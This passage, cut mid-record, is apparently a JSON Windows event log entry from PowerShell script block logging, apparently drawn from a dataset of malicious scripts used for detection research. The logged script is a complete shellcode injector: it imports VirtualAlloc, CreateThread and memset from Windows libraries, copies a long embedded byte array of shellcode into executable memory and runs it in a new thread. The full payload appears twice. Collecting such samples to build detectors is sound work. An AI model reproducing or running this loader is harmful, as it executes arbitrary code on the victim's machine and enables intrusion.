x30,0x86,0x00,0x78,0x9f,0x51,0x66,0x53,0x67,0xcd,0x99,0x5b,0x98,0xc7,0x5d,0x0f,0xc8,0x7f,0x77,0x2f,0x83,0x7f,0x78,0xfa,0x04,0xd0,0xd6,0x54,0xe5,0x80,0x96,0x04,0x8d,0xca,0x18,0x7b,0xad,0xf4,0xf2,0x14,0xc6,0x19,0xfd,0x1a,0x17,0x72,0x98,0x75,0x79,0xb9,0x50,0xba,0xb5,0x93,0xf0,0xd8,0xdb,0x98,0xd6,0x4e,0x41,0x2b,0x27,0xe6,0x20,0xfb,0x13,0x76,0xcd,0x29,0xd0,0x36,0x2e,0xb8,0xe2,0xe6,0x26,0x3e,0xed,0x17,0xeb,0xb7,0x0b,0x7d,0x03,0x9e,0x84,0xe9,0xba,0xbb,0x5f,0x88,0x43,0x16,0x1a,0x8a,0xc8,0x95,0xda,0x44,0x39,0xd3,0xc8,0x30,0xc9,0xae,0xb3,0x96,0xd6,0x04,0xd9,0x16,0x43,0xa3,0x48,0x41,0xfb,0xa9,0xad,0xa5,0xa4,0x52,0x98,0xbe,0x6d,0xc7,0x63,0xa8,0x91,0x07,0x64,0x28,0xc4,0x4d,0x64,0x40,0xb0,0x35,0x37,0x75,0xbf,0xe3,0x2b,0x26,0x2a,0x0c,0x1a,0x9b,0xfd,0x64,0xa0,0xc2,0xca,0x2a,0x5b,0x21,0xcb,0x17,0x8a,0x0f,0xb9,0x79,0x0e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ahJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ahJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ahJ,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 3fd1c7b4-d5ec-44d1-b16a-7e8a5eb35aa5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2111.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$daQY = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $daQY -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x2f,0x96,0xf9,0x11,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x4e,0x31,0x7e,0x14,0x03,0x7e,0x14,0x83,0xc6,0x04,0xcd,0x63,0x05,0xf9,0x93,0x8c,0xf6,0xfa,0xf3,0x05,0x13,0xcb,0x33,0x71,0x57,0x7c,0x83,0xf1,0x35,0x71,0x68,0x57,0xae,0x02,0x1c,0x70,0xc1,0xa3,0xaa,0xa6,0xec,0x34,0x86,0x9b,0x6f,0xb7,0xd4,0xcf,0x4f,0x86,0x17,0x02,0x91,0xcf,0x45,0xef,0xc3,0x98,0x02,0x42,0xf4,0xad,0x5e,0x5f,0x7f,0xfd,0x4f,0xe7,0x9c,0xb6,0x6e,0xc6,0x32,0xcc,0x29,0xc8,0xb5,0x01,0x42,0x41,0xae,0x46,0x6e,0x1b,0x45,0xbc,0x05,0x9a,0x8f,0x8c,0xe6,0x31,0xee,0x20,0x15,0x4b,0x36,0x86,0xc5,0x3e,0x4e,0xf4,0x78,0x39,0x95,0x86,0xa6,0xcc,0x0e,0x20,0x2d,0x76,0xeb,0xd0,0xe2,0xe1,0x78,0xde,0x4f,0x65,0x26,0xc3,0x4e,0xaa,0x5c,0xff,0xdb,0x4d,0xb3,0x89,0x9f,0x69,0x17,0xd1,0x44,0x13,0x0e,0xbf,0x2b,0x2c,0x50,0x60,0x94,0x88,0x1a,0x8d,0xc1,0xa0,0x40,0xda,0x26,0x89,0x7a,0x1a,0x20,0x9a,0x09,0x28,0xef,0x30,0x86,0x00,0x78,0x9f,0x51,0x66,0x53,0x67,0xcd,0x99,0x5b,0x98,0xc7,0x5d,0x0f,0xc8,0x7f,0x77,0x2f,0x83,0x7f,0x78,0xfa,0x04,0xd0,0xd6,0x54,0xe5,0x80,0x96,0x04,0x8d,0xca,0x18,0x7b,0xad,0xf4,0xf2,0x14,0xc6,0x19,0xfd,0x1a,0x17,0x72,0x98,0x75,0x79,0xb9,0x50,0xba,0xb5,0x93,0xf0,0xd8,0xdb,0x98,0xd6,0x4e,0x41,0x2b,0x27,0xe6,0x20,0xfb,0x13,0x76,0xcd,0x29,0xd0,0x36,0x2e,0xb8,0xe2,0xe6,0x26,0x3e,0xed,0x17,0xeb,0xb7,0x0b,0x7d,0x03,0x9e,0x84,0xe9,0xba,0xbb,0x5f,0x88,0x43,0x16,0x1a,0x8a,0xc8,0x95,0xda,0x44,0x39,0xd3,0xc8,0x30,0xc9,0xae,0xb3,0x96,0xd6,0x04,0xd9,0x16,0x43,0xa3,0x48,0x41,0xfb,0xa9,0xad,0xa5,0xa4,0x52,0x98,0xbe,0x6d,0xc7,0x63,0xa8,0x91,0x07,0x64,0x28,0xc4,0x4d,0x64,0x40,0xb0,0x35,0x37,0x75,0xbf,0xe3,0x2b,0x26,0x2a,0x0c,0x1a,0x9b,0xfd,0x64,0xa0,0xc2,0xca,0x2a,0x5b,0x21,0xcb,0x17,0x8a,0x0f,0xb9,0x79,0x0e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ahJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ahJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ahJ,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"3fd1c7b4-d5ec-44d1-b16a-7e8a5eb35aa5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2111.ps1"}}},"location":"EventChannel"}
